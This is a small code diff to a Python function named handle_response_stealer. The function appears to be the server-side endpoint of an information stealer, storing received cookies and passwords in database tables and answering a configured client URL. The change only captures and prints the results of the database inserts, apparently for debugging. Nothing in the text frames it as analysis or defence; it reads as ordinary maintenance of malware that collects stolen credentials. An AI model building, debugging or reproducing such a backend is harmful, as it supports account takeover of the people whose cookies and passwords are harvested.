@@ -244,9 +244,11 @@ def handle_response_stealer():
 
         query_passwords = "INSERT INTO passwords VALUES(%s, %s, %s, %s, %s, %s)" 
 
-        tools.executeMany(query_cookies, cookie_values)
-        tools.executeMany(query_passwords, password_values)
+        response1 = tools.executeMany(query_cookies, cookie_values)
+        response2 = tools.executeMany(query_passwords, password_values)
 
+        print("Response1: " + response1)
+        print("Response2: " + response2)
         return "Success", 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as error:
         print(error)
